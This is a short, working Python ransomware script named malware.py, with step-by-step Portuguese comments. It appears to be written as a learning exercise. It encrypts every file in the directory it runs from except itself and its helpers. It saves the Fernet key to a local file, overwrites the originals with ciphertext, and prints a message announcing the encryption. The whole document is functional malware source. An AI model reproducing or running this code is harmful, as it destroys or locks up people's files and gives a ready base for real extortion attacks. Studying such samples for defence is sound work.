#indica que o interpretador Python 3 deve ser utilizado para executar o script
#!/usr/bin/env python3

#Importa o módulo os para interagir com o sistema operativo
import os
#Importa Fernet do módulo cryptography para criptografia de dados
from cryptography.fernet import Fernet

#Itera sobre os arquivos no diretório atual
files = []
for file in os.listdir():

#Verifica se o arquivo é "malware.py", "thekey.key" ou "decrypt.py e se for um desses arquivos, o loop continua para o próximo arquivo
	if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
		continue

#Verifica se o item iterado é um arquivo e Se for um arquivo, adiciona o seu nome à lista de arquivos válidos e por sua vez imprime
	if os.path.isfile(file):
		files.append(file)
print("Encrypted files: ", files)

# Gera uma chave de criptografia e po sua vez Abre um arquivo chamado 'thekey.key' em modo de escrita binária ('wb')
key = Fernet.generate_key()
with open("thekey.key", "wb") as  thekey:
	thekey.write(key)

#Itera sobre cada 'file' na lista 'files' , por sua vez Abre o arquivo em modo de leitura binária e po fim, Lê o conteúdo do arquivo e o armazena na variável 'content'
for file in files:
	with open(file, "rb") as  thefile:
		content = thefile.read()

# criar um objeto Fernet com uma chave 'key', por sua vez, Abre o arquivo em modo de escrita binária e por fim, Imprime uma mensagem informando que os arquivos foram encriptados
	content_encrypt = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encrypt)

print( "Todos os seus arquivos foram encriptados!")
